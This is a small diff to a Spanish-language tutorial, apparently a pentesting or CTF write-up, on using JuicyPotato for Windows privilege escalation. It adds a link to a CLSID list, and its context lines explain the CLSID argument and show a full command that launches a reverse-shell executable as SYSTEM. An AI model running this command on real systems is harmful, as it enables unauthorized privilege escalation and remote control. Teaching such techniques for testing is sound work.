@@ -192,6 +192,8 @@ Para ejecutar `JuicyPotato` debemos agregarle algunos argumentos:
 `-c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} ` = Especifica el **CLSID** (Class ID)
 	Es el identificador único de un objeto COM/DCOM específico del sistema Windows. JuicyPotato abusa de este CLSID para forzar al servicio subyacente a realizar la autenticación hacia el puerto configurado (1234)
 
+	[Ver CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)
+
 `JuicyPotato.exe -l 1234 -p rshell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`
 
 ### Cómo funciona?
